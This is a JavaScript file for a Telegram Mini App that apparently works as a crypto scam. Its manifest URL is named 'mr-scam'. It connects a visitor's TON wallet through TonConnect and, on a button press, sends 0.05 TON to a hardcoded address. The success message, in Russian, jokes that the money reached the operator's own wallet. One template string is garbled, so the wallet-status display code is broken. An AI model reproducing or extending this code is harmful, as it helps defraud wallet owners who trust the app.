const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

const usernameEl = document.getElementById('username');
let username = 'Guest';
if (tg.initDataUnsafe?.user) {
  const user = tg.initDataUnsafe.user;
  username = user.username ? `@${user.username}` : user.first_name || 'User';
}
usernameEl.textContent = username;

// TonConnect UI (новая версия)
const tonConnectUI = new TonConnectUI({
  manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
  buttonRootId: 'connect-wallet'
});

let connectedWallet = null;
tonConnectUI.onStatusChange(wallet => {
  if (wallet) {
    connectedWallet = wallet.account.address;
    document.getElementById('wallet-status').innerHTML = `<strong>подключён</strong><br>\( {connectedWallet.slice(0,8)}... \){connectedWallet.slice(-6)}`;
  } else {
    connectedWallet = null;
    document.getElementById('wallet-status').textContent = 'не подключён';
  }
});

// Отправка TON на твой адрес
document.getElementById('send-ton').onclick = async () => {
  if (!connectedWallet) return alert('⚠️ Подключи кошелёк сначала!');

  const transaction = {
    validUntil: Math.floor(Date.now() / 1000) + 600,
    messages: [{
      address: 'UQBpBH_apAYKPChl7V1wfEeZ1JovWFIr2VXfzTVUVQfDXHrZ', // Твой реальный адрес
      amount: '50000000' // 0.05 TON
    }]
  };

  try {
    await tonConnectUI.sendTransaction(transaction);
    alert('✅ 0.05 TON успешно отправлено в Mr. Scam!\nПришло на твой кошелёк 😈');
  } catch (e) {
    alert('❌ Ошибка: ' + (e.message || 'Отменено'));
  }
};
